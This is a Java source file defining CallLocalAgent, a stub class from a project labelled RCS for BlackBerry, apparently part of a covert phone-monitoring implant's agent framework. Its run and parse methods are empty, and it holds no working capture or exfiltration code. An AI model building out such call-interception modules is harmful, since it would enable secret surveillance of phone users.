//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : CallLocalAgent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.agent;

import blackberry.config.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;


/**
 * The Class CallLocalAgent.
 */
public final class CallLocalAgent extends Agent {
    //#ifdef DEBUG
    private static Debug debug = new Debug("CallLocalAgent", DebugLevel.VERBOSE);
    //#endif

    /**
     * Instantiates a new call local agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public CallLocalAgent(final boolean agentEnabled) {
        super(Agent.AGENT_CALL_LOCAL, agentEnabled, Conf.AGENT_CALLLOCAL_ON_SD, "CallLocalAgent");
    }

    /**
     * Instantiates a new call local agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected CallLocalAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        
        return false;
    }

}
